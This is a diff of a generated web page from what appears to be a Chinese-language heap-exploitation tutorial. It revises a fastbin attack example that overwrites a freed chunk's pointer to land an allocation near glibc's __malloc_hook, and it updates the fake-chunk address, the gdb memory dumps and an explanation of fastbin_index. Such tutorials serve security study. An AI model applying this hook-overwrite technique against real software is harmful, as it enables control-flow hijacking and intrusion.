@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-0.17.3, mkdocs-material-2.7.2">
+      <meta name="generator" content="mkdocs-0.17.3, mkdocs-material-2.7.3">
     
     
       
@@ -3772,13 +3772,13 @@ int main(void)
 
     free(chunk1);
 
-    *(long long *)chunk1=0x7ffff7dd1b05;
+    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
     malloc(0x60);
     chunk_a=malloc(0x60);
     return 0;
 }
 </pre></div>
-这里的0x7ffff7dd1b05是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。
+这里的0x7ffff7dd1af5是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。
 <div class="codehilite"><pre><span></span>0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
 0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
 0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
@@ -3815,21 +3815,21 @@ Fastbins[idx=6, size=0x70]
 0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f
 </pre></div>
 因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
-<div class="codehilite"><pre><span></span><span class="cp">##define fastbin_index(sz)                                                      \</span>
+<p><div class="codehilite"><pre><span></span><span class="cp">##define fastbin_index(sz)                                                      \</span>
 <span class="cp">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span>
 </pre></div>
-
+（注意sz的大小是unsigned int，因此只占4个字节）</p>
 <p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。
-最后经过两次分配可以观察到 chunk 被分配到 0x00007ffff7dd1b15，因此我们就可以直接控制 __malloc_hook的内容。</p>
+最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 <strong>malloc_hook的内容(在我的libc中</strong>realloc_hook与__malloc_hook是在连在一起的)。</p>
 <div class="codehilite"><pre><span></span>0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
  →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax
 
- $rax   : 0x00007ffff7dd1b15 
+ $rax   : 0x7ffff7dd1afd 
 
-0x7ffff7dd1b05 &lt;__memalign_hook+5&gt;: 0xfff7a92a0000007f  0x000000000000007f
-0x7ffff7dd1b15 &lt;__malloc_hook+5&gt;:   0x0000000000000000  0x0000000000000000
-0x7ffff7dd1b25 &lt;main_arena+5&gt;:  0x0000000000000000  0x0000000000000000
-0x7ffff7dd1b35 &lt;main_arena+21&gt;: 0x0000000000000000  0x0000000000000000
+0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;:   0xfff7dd0260000000  0x000000000000007f
+0x7ffff7dd1afd: 0xfff7a92e20000000  0xfff7a92a0000007f
+0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;:  0x000000000000007f  0x0000000000000000
+0x7ffff7dd1b1d: 0x0000000000000000  0x0000000000000000
 </pre></div>
 
 <h3 id="_14">小总结<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
